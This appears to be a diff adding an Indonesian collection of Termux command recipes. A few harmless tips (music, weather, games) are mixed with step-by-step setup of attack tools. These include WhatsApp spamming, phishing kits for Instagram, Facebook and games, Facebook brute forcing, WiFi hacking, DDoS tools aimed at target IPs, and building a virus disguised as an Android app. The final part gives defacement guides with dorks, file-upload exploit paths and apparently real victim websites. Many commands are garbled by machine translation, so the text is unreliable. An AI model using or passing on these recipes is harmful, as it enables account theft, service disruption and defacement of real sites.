@@ -1,0 +1,706 @@
+KUMPULAN KODE TERMUX LENGKAP 
+
+| SPAM CHAT WHATSAPP || nggk usah nyepam gw -_* atau hp lu gw ledakin!!#@vms
+$ pkg pembaruan && peningkatan pkg
+Setelah mengupdate dan mengupgrade termux ketikan perintah berikut :
+$ pkg install python2 (y/n pilih y)
+$ pkg install php (y/n pilih y)
+$ pkg install git (y/n pilih y)
+Setalah mengikuti perintah di atas waktu-nya kita mengkloning tool-nya :
+$ git clone https://github.com/siputra12/prank.git
+Setelah proses cloning selesai kita move on dari perintah di atas dan ketikan perintah ini :
+$cd lelucon
+$ l
+$php wa.php
+Kemudian masukan Nomor WhatsApp yang kamu ingin spam contoh : 085710917169 lalu enter pada pilihan y/n pilih y
+.. .selamat datang kembali padaku catatan :)... #@vms
+         " jngan lupa subcribe pak *VEMAS DARK* -_-... (:"
+"permainan phising"
+(mobile legend dan clash of clan)
+$perbaruan tepat
+$apt upgrade -y
+$pkg instal python2 -y
+$pkg instal apache2
+$pkg instal php -y
+$pkg instal git
+$git clone https://github.com/Senitopeng/PhisingGame
+$l
+$cd PhisingGame
+$python2 phising.py
+*Gunain dengan bucin cuk -_-*
+Cara Install OSIF ( Informasi Open Source Facebook )
+$ pkg instal python2
+$ git clone https://github.com/ciku370/OSIF
+$cd OSIF
+$ pip2 install -r requirements.txt
+Dan cara menjalankannya menggunakan perintah :
+python2 osif.py
+   oleh: *Vdk*
+*~CARA SADAP WA~*
+*_SeNaNg-SeNaNg H4CK1NG MR.STAH_*
+pembaruan $pkg && peningkatan pkg
+$pkg instal git
+$pkg instal curl
+$git clone https://github.com/AndriGanz/whatshack
+$cd whatshack
+$l
+$sh whatshack.sh
+*~Jangan salah gunakan~*
+Tutorial termux
+Mohon perdalami...
+Alat D-tek
+Cara Install D-tect tool di android termux (command) :
+$ tepat instal git
+$ tepat instal python2
+$ git clone https://github.com/shawarkhanethicalhacker/D-TECT
+$ l
+$ cd D-TECH
+$ chmod +x d-tect.py
+$ python2 d-tect.py
+2. cara uninstall tool termux
+rm -rf toolsnya
+3. cara buat virus
+cd / kartu sd
+cd vbug
+ls
+chmod vbug.py
+chmod -v vbug.py
+python2 vbug.py
+4. irssi
+  /connet irc.freenode.net
+/nick w3wandroid
+/bergabung dengan #modol
+_________________________
+DDOS melalui Termux
+—————————————
+1. Palu
+$pkg update (tekan enter)
+$pkg upgrade (tekan enter)
+$ pkg install python (tekan enter)
+$ pkg install git (tekan enter)
+$git clone https://github.com/cyweb/hammer (tekan enter)
+$cd hammer (tekan enter)
+$ python hammer.py (tekan enter)
+$ python hammer.py -s [target IP] -p [port] -t 135 (tekan enter) 104.27.146.125
+2. Xerxes
+$ tepat instal git
+$ tepat instal dentang
+$ git clone https://github.com/zanyarjamal/xerxes
+$ l
+$cd xerxes
+$ l
+$ dentang xerxes.c -o xerxes
+$ l
+$ ./xerxes (nama situs web) 80
+3. Torshammer
+$pkg pembaruan
+$ pkg instal git
+$ tepat instal untuk
+$ pkg instal python2
+$ git clone https://github.com/dotfighter/torshammer.git
+$ l
+$cd torshammer
+$ python2 torshammer.py
+4. liteDDOS
+$ pembaruan tepat
+$ tepat peningkatan
+$ pkg instal git
+$ pkg instal python2
+$ git clone https://github.com/4L13199/LITEDDOS
+$cd LITEDDOS
+$ python2 liteDDOS.py
+_________________________________________
+Bermain kereta bulan
+$ pkg menginstal kereta bulan
+$ kereta bulan
+_________________________________________
+Musikan di termux
+$ pkg instal mpv
+$ mpv/sdcard/lagu.mp3
+/sdcard/ bisa di ganti sesuai letak musik
+_________________________________________
+Browsing di termux
+$ pkg instal w3m
+$w3m www.google.com
+Linknya bsa diubah
+_________________________________________
+Telepon di termux
+$ pkg instal termux-api
+$ termux-telephony-call nomornya
+_______________________________________
+ada animasi kereta 
+$ pkg instal sl
+$ sl
+_______________________________________
+menampilkan ikon dan informasi sistem android
+$ pkg instal neofetch
+$ neofetch
+_______________________________________
+menampilkan teks dalam format ASCII
+$ pkg instal figlet
+$ figlet masukin teksnya
+_______________________________________
+Cara Mendengarkan Yotuube di termux
+$pip pasang mps_youtube
+$pip pasang youtube_dl
+$ tepat menginstal mpv
+$ mpsyt
+$ /judul lagu
+Tinggal pilih lagu dengan mengetik nomornya.                   
+Tutorial membuat virus seperti aplikasi Sleeping
+Alat yang dibutuhkan: APK Editor & alat vbug
+APK Editor bisa didownload di playstore
+Alat vbug Di Sini
+1. Download tool vbugnya dulu
+2. Taruh file tool vbug di folder luar pada memori internal
+3. Buka termux lalu $cd /sdcard
+4. $ unzip vbug.zip
+5. $cd vbug
+6. $ python2 vbug.py
+7. Masuk
+8. Ketik 10
+9. Ketik E
+10. Aplikasi virusnya sudah jadi
+Setelah aplikasinya jad kita tinggal edit ikut mengiringi legenda itu
+1. Buka Editor APK
+2. Klik Pilih File Apk
+3. Pilih aplikasi virus tadi
+4. Klik edit penuh
+5. Pada bagian kolom app_name tulis nama aplikasi yang kalian inginkan
+6. Lalu klik file
+7. Klik res/drawable
+8. Logo yang kedua itu ganti dengan logo aplikasi yang kalian inginkan
+Catatan: format logo harus .png
+9. Ceklist logo yang kedua lalu ganti
+10. Pilih file logo yang mau dijadikan logo aplikasi agan
+11. Kembali ke rumah
+Agar aplikasi terlihat lebih nyata kita harus memberi bobot pada aplikasi buatan kita
+12. Klik tanda plus yang ada di bawah kiri, pilih file, lagu, gambar atau apapun yang coxok sebagai bobot apliaksi agan
+13. Klik build
+14. Tunggu hingga selesai
+15. Jadi deh
+—————————
+Booting otomatis fb
+git clone https://github.com/Senitopeng/BotFbBangDjon.git
+cd BotFbBangDjon
+python2 bangdjon.py
+melihat id fb
+https://findmyfbid.in/
+Facebook reaksi otomatis
+git clone https://github.com/tomiashari/fb-autoreaction.git
+cd fb-autoreaction
+python2 fb-autoreaction
+•ALAT²TERMUX.P3
+21.ALAT SQLMAP
+pembaruan yang tepat
+apt instal python
+apt instal python2
+tepat menginstal git
+git clone https://github.com/sqlmaproject/sqlmap
+cd sqlmap
+python2 sqlmap.py
+===============================
+22.TUTORIAL PHISING INSTAGRAM VIA TERMUX
+pembaruan pkg
+peningkatan pkg
+pkg instal python2
+pkg instal git
+jernih
+git clone https://github.com/evait-secutiry/weeman.git
+CD
+ls
+cd weeman
+python2 weeman.py
+menunjukkan
+set url http://dewopanel.host22.com/masuk.php
+setel port 8080
+set action_url http://dewopanel.host22.com/masuk.php
+Lari
+===============================
+23.TUTORIAL MENAMBAH FOLLOWERS&LIKE INSTAGRAM
+Kegunaan untuk menambah follower dan like ig
+pembaruan pkg
+peningkatan pkg
+pkg instal python2
+pkg instal ruby
+instal permata lolcat
+pkg instal git
+git clone https://github.com/Hanzelnutt/instabot
+cd instabot
+ls
+pip2 install -r requirements.txt
+bash instagram
+===============================
+24.TUTOR HACK WIFI KHUSUS ROOT
+pembaruan yang tepat
+peningkatan yang tepat
+tepat menginstal git
+git clone https://github.com/esc0rtd3w/wifi-hacker
+ls
+cd wifi-hacker
+ls
+chmod +x wifi-hacker.sh
+ls
+./wifi-hacker.sh
+===============================
+25.ALAT xNOT_FOUND *VER1*
+pembaruan yang tepat && peningkatan yang tepat
+pkg instal git
+pkg instal permata
+pkg instal figlet
+instal permata lolcat
+git clone https://github.com/hatakecnk/xNot_Found
+cd xNot_Ditemukan
+sh xNot_Found.sh
+===============================
+26.HACK FB
+Nih ada tutor buat lewat TERMUX buat hack FB
+pembaruan yang tepat && peningkatan yang tepat
+apt instal python
+apt instal python2
+tepat menginstal ruby
+tepat menginstal git
+apt instal wget
+apt install curl
+pip2 menginstal mekanisme
+permintaan pemasangan pip2
+git clone https://github.com/hnov7/mbf
+*tunggu hingga selesai,jika sudah selesai
+*silahkan buka tab baru atau new session lalu ketik :
+cd mbf
+python2 mbf.py
+===============================
+27.HACK GMAIL
+apt-get update && apt-get upgrade
+ apt-get install git
+ apt-get install python python-pip python-setuptools
+ pip install scapy
+ git clone https://github.com/wifiphisher/wifiphisher.git
+cd wifiphisher<
+python setup.py instal
+ cd wifiphisher
+ python wifiphisher
+===============================
+28.BERMAIN MOON-BUGGY
+pkg instal kereta bulan
+kereta bulan
+===============================
+29.PERKIRAAN CUACA
+curl http://wttr.in/ (lokasi) 
+===============================
+30.Browsing DI TERMUX
+pkg instal w3m
+w3m www.google.com
+Linknya bsa diubah
+===============================
+[8/10 19.49] Yovis Si Wibub: Update tepat
+Peningkatan yang tepat
+Mekanisasi pemasangan yang tepat
+Apt instal git
+git clone http://github.com/hnov7/mbf
+cd mbf
+python2 mbf. py
+Mbf tanpa username dan password. Jdi tinggl buat aja
+[8/10 19.49] Yovis Si Wibub: ---------------TOTUR MBF------------ -----------$ pembaruan pkg && peningkatan pkg
+$ pkg instal python2
+$ pip2 menginstal mekanis
+$ git clone https://github.com/pirmansx/mbf
+Cara garisnya :
+$ l
+$cd mbf
+$ python2 MBF.py
+
+[9/10 17.25] *~I⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟: Memper Cantik/Melihat V.Android Termux
+$ pkg pembaruan && peningkatan pkg
+$ pkg pasang ruby ​​cowsay toilet figlet
+$ pkg instal neofetch
+$ pkg instal nano
+$ instal permata lolcat
+$cd ../usr/etc
+$ nano bash.bashrc
+cowsay -f mata Cyber ​​| lolcat
+toilet -f standar indonesia -F gay
+neofetch
+tanggal | lolcat
+✓.
+Retas grup FB
+$ pembaruan tepat && peningkatan tepat
+$ pkg instal python2 git
+$ pip2 menginstal mekanis
+$ git clone http://github.com/pirmansx/mbf
+$ l
+$cd mbf
+$ python2 MBF.py
+✓.
+Hack FB ngincer
+$ Pembaruan tepat ( Enter )
+$ Peningkatan yang tepat ( Enter )
+$ Apt install python2 ( Enter )
+$ pip2 install urllib3 chardet certifi idna request ( Enter )
+$ apt install openssl curl ( Enter )
+$ pkg install libcurl ( Enter )
+$ln /sdcard ( Enter ) 
+$cd /sdcard (Masukkan)
+$ python2 fbbrute.py ( Masuk )
+✓.
+Meretas Gmail
+apt-get update && apt-get upgrade
+$ apt-get install git
+$ apt-get install python python-pip python-setuptools
+$ pip menginstal scapy
+$ git clone https://github.com/wifiphisher/wifiphisher.git
+$cd wifiphisher<
+$ python setup.py install
+$cd wifiphisher
+$ python wifiphisher
+ Nih yang mau hack WiFi Khusus root
+$perbaruan tepat
+$perbarui yang tepat
+$apt install git
+$git clone https://github.com/esc0rtd3w/wifi-hacker
+$l
+$cd
+Ni KUMPULAN TUTOR TERMUX [X SCREW UP X]
+*HACK INSTAGRAM*
+(rekayasa sosial)
+$ pembaruan tepat && peningkatan tepat
+$ pkg instal python
+$ pkg instal git 
+$ pkg instal nano
+$ git clone https://github.com/avramit/instahack.git
+$ l
+$cd instahack
+$ l
+$ pip permintaan pemasangan
+$cd instahack
+$ nano pass.txt
+$cat pass.txt
+$ l
+$ python hackinsta.py
+Lokalkan ip
+Apt instal python git
+git clone https://github.com/maldevel/IPGeoLocation.git
+cd IPGeoLocation
+chmod +x ipgeoLocation.py
+instal pip -r requirements.txt
+python ipgeolocation.py -m
+python ipgeolocation.py -t http://www.google.com
+Lacak IP
+git clone https://github.com/maldevel/IPGeolocation
+cd IPGeolocation
+chmod +x ipgeolocation.py
+instal pip -r requirements.txt
+python ipgeolocation.py -m
+python ipgeolocation.py -t IP yang ingin dilacak
+ALAT DDOS MELALUI TERMUX
+1. Palu
+$pkg update (tekan enter)
+$pkg upgrade (tekan enter)
+$ pkg install python (tekan enter)
+$ pkg install git (tekan enter)
+$git clone https://github.com/cyweb/hammer (tekan enter)
+$cd hammer (tekan enter)
+$ python hammer.py (tekan enter)
+$ python hammer.py -s [target IP] -p [port] -t 135 (tekan enter)  
+2. Xerxes
+$ tepat instal git
+$ tepat instal dentang
+$ git clone https://github.com/zanyarjamal/xerxes
+$ l
+$cd xerxes
+$ l
+$ dentang xerxes.c -o xerxes
+$ l
+$ ./xerxes (nama situs web) 80
+3. Torshammer
+$pkg pembaruan
+$ pkg instal git
+$ tepat instal untuk
+$ pkg instal python2
+$ git clone https://github.com/dotfighter/torshammer.git
+$ l 
+$cd torshammer
+$ python2 torshammer.py
+4. liteDDOS
+$ pembaruan tepat
+$ tepat peningkatan
+$ pkg instal git
+$ pkg instal python2
+$ git clone https://github.com/4L13199/LITEDDOS
+$cd LITEDDOS
+$ python2 liteDDOS.py
+Alat RED_HAwk
+$ pembaruan tepat
+$ tepat instal git
+$ git clone https://github.com/Tuhinshubhra/RED_HAWK
+$cd RED_HAwk
+$ chmod +x rhawk.php
+$ tepat menginstal php
+$ l
+$php rhawk.php
+```Instal webdav ```
+$ tepat memperbarui && meningkatkan 
+$ tepat instal python2 
+$pip2 install urllib3 chardet certifi idna request 
+$ apt install openssl curl 
+$ pkg instal libcurl 
+$ ln -s /sdcard 
+$cd sdcard 
+$mkdir webdav 
+$ cd webdav
+Tutorial Instal
+*Alat-B4J1N64Nv5*
+pkg menginstal pembaruan
+pkg instal git
+pkg pasang toilet
+pkg instal figlet
+instal pip2 lolcat
+git clone https://github.com/DarknessCyberTeam/B4J1N64Nv5
+cd B4J1N64Nv5
+sh B4J1N64N.sh
+cara install termux ubuntu
+- apt update/pkg update - apt upgrade/pkg upgrade - pkg install git - pkg install proot - pkg install wget - git clone https://github.com/Neo-Oli/termux-ubuntu - cd termux-ubuntu - chmod + x ubuntu.sh - pip install -r requirements.txt - ./ubuntu.sh Untuk menjalankan - ./start.sh
+Cara install github tembak XL
+Dari awal 
+1.pkg peningkatan
+2.pkg pembaruan
+3.pkg instal git
+4.pkg instal python
+5.git clone https://github.com/albertoanggi/xl-py
+6.pip install -r requirements.txt
+7.chmod +x app.py
+8.python/python2 app.py
+*Instal pencari admin di termux*
+$ pembaruan tepat && peningkatan tepat
+$ pkg instal python2
+$ pkg instal git
+$ git clone https://github.com/AdheBolo/AdminFinder
+*Menjalankan*
+$ l
+$cd AdminFinder
+$ chmod 777 AdminFinder.py
+$ python2 AdminFinder.py
+*cara install alat Mr.Rv1.1*
+$apt update && apt upgrade
+$pkg instal git
+$pkg instal permata
+$pkg instal figlet
+instal $gem lolcat
+$git clone https://github.com/Mr-R225/Mr.Rv1.1
+$cd Mr.Rv1.1
+$sh Mr.Rv1.1.sh
+pemasangan alat
+$ pembaruan tepat && peningkatan tepat
+$ tepat instal git
+$ git clone https://github.com/aryanrtm/4wsectools
+cd 4wsectools
+alat chmod 777
+./peralatan
+ALAT FSOCIETY
+$ git clone https://github.com/manisso/fsociety
+$ cd fsociety
+$ ./install.sh
+$ l
+$ python2 fsociety.py
+SQLMAP 
+pembaruan yang tepat
+apt instal python
+apt instal python2
+tepat menginstal git
+git clone https://github.com/sqlmaproject/sqlmap
+https://github.com/sqlmapproject/sqlmap.git
+cd sqlmap
+Python2 sqlmap.py
+contoh
+Python2 sqlmap.py -u situs web –dbs
+-D acuart –tabel
+-D acuart -T pengguna –kolom
+-D acuart -T pengguna -C nama,email,telepon -dump
+SITUS ADM DE BUSCA PAINEL
+pkg instal git
+git clone https://github.com/Techzindia/admin_penal
+cd admin_penal
+chmod +x admin_panel_finder.py
+python2 admin_panel_finder.py
+HAKKU
+apt instal pytho
+tepat menginstal git
+mkdir vasu
+git clone https://github.com/4shadoww/hakkuframework
+cd hakkuframework
+chmod +x hakku
+python hakku
+menunjukkan modul
+gunakan whois
+tampilkan pilihan
+tetapkan target examplesite.com
+Lari
+ALAT D-TECT
+pembaruan yang tepat
+tepat menginstal git
+git clone https://github.com/shawarkhanethicalhacker/D-TECT
+cd D-TECT
+apt instal python2
+chmod +x d-tect.py
+python2 d-tect.py
+situs contoh.com
+viSQL
+pembaruan yang tepat
+apt instal python2
+tepat menginstal git
+git clone https://github.com/blackvkng/viSQL
+cd viSQL
+python2 -m pip install -r requirements.txt
+python2 viSQL.py
+python2 viSQL.py -t http://www.bible-history.com
+Hash Buster
+pembaruan yang tepat
+peningkatan yang tepat
+apt instal python2
+tepat menginstal git
+git clone https://github.com/UltimateHackers/Hash-Buster
+cd Hash-Buster
+python2 hash.py
+alat ubuntu
+$ pembaruan tepat
+$ tepat instal git
+$ tepat instal wget
+$ tepat menginstal root
+$ git clone https://github.com/Neo-Oli/termux-ubu…
+$cd termux-ubuntu
+$ chmod +x ubuntu.sh
+$ ./ubuntu.sh
+$ ./start.sh
+(````Instal``` *kerangka kerja Pemburu*)
+$ pembaruan tepat 
+$ tepat instal python
+$ apt install git -y
+$ git clone https://github.com/b3-v3r/Hunner
+$cd Pemburu
+$ chmod 777 pemburu.py
+$ python pemburu.py
+*Cara Instal Lazymux di Termux*
+$ pkg memperbarui && meningkatkan 
+$ pkg instal python2 
+$ pkg instal git 
+$ git clone https://github.com/Gameye98/Lazymux 
+$cd Lazymux 
+$ chmod +x lazymux.py 
+$ python2 lazymux.py
+Cara pasang alat daijobu*
+Fungsinya nanti liat sendiri lah di dalem tools nya 
+$perbarui yang tepat && pembaruan yang tepat 
+$apt instal php 
+$apt install git 
+Kalo udah selesai langsung masukan git nya dengan perintah 
+$git clone https://github.com/alintamvanz/diejoubu 
+$cd diejoubu 
+$cd v1.2 
+$php diejoubu.php
+Hecker RECONDOG
+pembaruan yang tepat
+apt instal python python2
+tepat menginstal git
+git clone https://github.com/UltimateHackers/ReconDog
+cd ReconDog
+chmod +x dog.py
+Python2 dog.py
+MENGHAPUS
+Hacking Script-Deface
+$perbaruan tepat
+$perbarui yang tepat
+$apt install git
+$apt instal python2
+$git clone https://github.com/Ubaii/script-deface-creator
+$l
+$cd script-deface-creator
+$l
+$chmod +x create.py
+$l
+$python2 create.py
+done semoga bisa bikin script Html
+CARA DEFACE 
+Cara1
+Siapkan scriptnya sendiri..
+1.buka browser kalian apa saja terserah lalu ke google
+2.tulis dork nya berikut ini (inurl:"sitefinity/login.aspx) tanpa tanda buka kurung dan tutup kurung! lalu search
+3.pilih lah salah satu website terserah kalian,klik websitenya lalu tambahkan exploitnya sebagai berikut (sitefinity/usercontrols/dialog/documenteditordialog.aspx) tanpa buka tutup kurung! E http://sitetarget*org/sitefinity/usercontrols/dialogs/documenteditordialog.aspx
+4.lalu klik search kembali! nah disitu kalian klik pilih file dan pilih script deface punya kalian
+5.klik yang di bawahnya tunggu sampai loading selesai
+6.tambah link target tadi dengan (/files) contoh http://sitetarget*org/files/namascriptdefacekalian.html lalu klik search
+7. selesai!!
+Cara2
+Metode/metode KCFinder
+Inurl:/kcfinder/browse.php
+Inurl:/Kcfinder/
+Langsung saja upload file deface anda,lalu panggil dengan tambahan /file/namasckamu.html
+Contoh:
+https://basukiwater.com/kcfinder/browse.php
+jadi
+https://basukiwater.com/file/namasckamu.html
+cara3
+Deface Onion.to File Upload
+
+Tutor ini sekarang lagi Ngtrend & Simple , tapi ingat ya bukan Deepweb melaikan Fake Deepweb hehehe... Mari kita Lanjut...
+Dork : - inurl:/upload site:.onion.to
+           - intext:"Unggah" situs:.onion.to
+Langsung : https://tt3j2x4k5ycaa5zt.onion.to/upload.php
+Selangkah demi selangkah :
+1. Dorking Dulu
+2. Pilih Target Web
+3. Pilih File yang mau di'upload
+4. Tinggal klik Upload => Selesai
+Contoh Sasaran:
+https://tt3j2x4k5ycaa5zt.onion.to/uploads/lopeyou.html
+https://danwin1210.me/uploads/lopeyou.html
+https://temp.xn--wda.fr/e719x8JgJ.html
+Cermin?! 😆.
+https://www.defacer.id/296011.html
+https://www.defacer.id/296024.html
+cara4
+Metode com media
+bahan:
+1. Dork : - inurl:com_media site:com
+            - inurl:com_media intext:"Unggah"
+2. Eksploitasi : /index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder=
+3. Upload'an : Format .txt 😁
+Target Langsung : http://www.james-insurance.co.uk/
+Selangkah demi selangkah :
+gunakan Live Targert dulu untuk Uji Coba 😁
+1. Masukkan dork : inurl:com_media intext:"Upload" site:co.uk
+2. Pilih salah satu Web
+3. Masukkan Eksploitasi
+http://www.james-insurance.co.uk/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder=
+4. Lalu Upload file di tempat upload ( format .txt )
+Akses cangkang ?
+Tambahkan : /images/namafile.txt
+                       contoh : http://www.james-insurance.co.uk/images/fac.txt
+Nanti Jadi Gini Hasilnyaa..
+Mudah Bukan?! Tinggal Upload ke Defacer.id 😁
+cara5
+[POC] Kerentanan Kesederhanaan Upload
+#Langkah 1:
+Dork: “Didukung oleh: © Kesederhanaan Upload”
+#Langkah 2:
+Eksploitasi: http://[situstargetkamu]/PATH/upload.php
+*Tergantung dengan sasaran.
+#Langkah 3:
+file llowed: gif, jpg, png, txt, php, asp, cgi, zip, exe, mp3, dll (tidak diperbolehkan untuk html)
+#Langkah 4:
+Pratinjau: http://[situstargetkamu]/upload/[File Anda]
+#Langkah 5: Demo Langsung:
+http://www.railfaneurope.net/pix/upload.php
+http://www.formplas.com/upload/upload.php
+Nah, saya kira cukup segitu aja kok, karena mudah tuh tutorialnya.
+Al dalam satu crip termux
+$ pembaruan tepat && peningkatan tepat
+$ pkg instal php figlet ruby ​​python python2
+$pip2 instal lolcat
+$ git clone https://github.com/Rusmana-ID/rus
+$ cd
+$ cd rus
+$ l
+$sh v2.sh
+Kontak wa 083879017166
+Catatan: nama pengguna: Rusmana
+Kata sandi: X-One
